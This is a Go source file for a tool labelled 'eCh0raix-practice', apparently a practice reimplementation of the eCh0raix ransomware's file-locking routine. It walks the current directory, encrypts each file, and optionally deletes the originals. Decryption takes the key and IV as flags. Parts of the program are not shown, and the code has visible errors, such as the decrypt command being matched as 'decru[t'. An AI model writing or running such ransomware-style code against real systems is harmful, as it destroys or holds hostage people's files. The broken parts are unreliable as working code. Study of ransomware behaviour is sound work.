package main

import (
	"flag"
	"fmt"
	"os"
	"strings"
	"sync"
)

var (
	flagHelp        bool
	flagDel         bool
	flagRandom      bool
	flagKey, flagIv string
)

func init() {
	flag.BoolVar(&flagHelp, "h", false, "Show this help message")
	flag.BoolVar(&flagDel, "D", false, "Delete original files while doing CFBEncrypt")
	flag.BoolVar(&flagRandom, "R", false, "Generate key randomly")
	flag.StringVar(&flagKey, "key", "", "Decrypt key")
	flag.StringVar(&flagIv, "iv", "", "Decrypt iv")
	flag.Usage = usage
}

func usage() {
	fmt.Fprintf(os.Stderr, `eCh0raix-practice version: 1.0.0

Usage: CFBEncrypt CFBDecrypt [-h help] [-D delete]

Commands:
	CFBEncrypt		Encrypt all files from this folder
	CFBDecrypt		Decrypt all files from this folder
	help		Show this help message

Options:
`)
	flag.PrintDefaults()
}

func flagHandle() {
	if flagHelp {
		flag.Usage()
	}

	if flagRandom {
		key = RandSeq()
	}

	if len(flag.Args()) == 0 && !flagHelp{
		usage()
	}
	for _, v := range flag.Args() {
		lowV := strings.ToLower(v)

		switch lowV {

		case "encrypt":
			encryptHandle()
			break
		case "decru[t":
			decryptHandle()
			break
		case "help":
			usage()
		}
	}

}

func encryptHandle() {
	var ans string
	fmt.Print("Do you want to CFBEncrypt all files in current directory?[y|n] :")
	fmt.Scanf("%s", &ans)
	if ans == "y" || ans == "Y" {
		go chDir(path, ENC)

		wg := new(sync.WaitGroup)
		wg.Add(1)

		go func() {
			for {
				fName := <-ch
				if fName == "done" {
					wg.Done()
					break
				}
				makesecret(path+"/"+fName, key)
				fmt.Printf("file: \"%s\" ... encrypted!\n\n", fName)
				// Delete original file
				if flagDel {
					err := os.Remove(path + "/" + fName)
					if err != nil {
						fmt.Println(err)
					}
				}
			}

		}()

		wg.Wait()
	}
}

func decryptHandle() {
	//files := chDir(path)
	go chDir(path, DEC)
	if flagKey != "" {
		key = []byte(flagKey)
	}

	if flagIv != "" {
		iv = []byte(flagIv)
	}
	wg := new(sync.WaitGroup)
	wg.Add(1)
	go func() {
		for {
			fName := <-ch
			if fName == "done" {
				wg.Done()
				break
			}
			unsecret(path+"/"+fName, key)
			err := os.Remove(path + "/" + fName)
			check(err)
			fmt.Printf("file: \"%s\" ... decrypted!\n\n", fName)
		}

	}()
	wg.Wait()
}
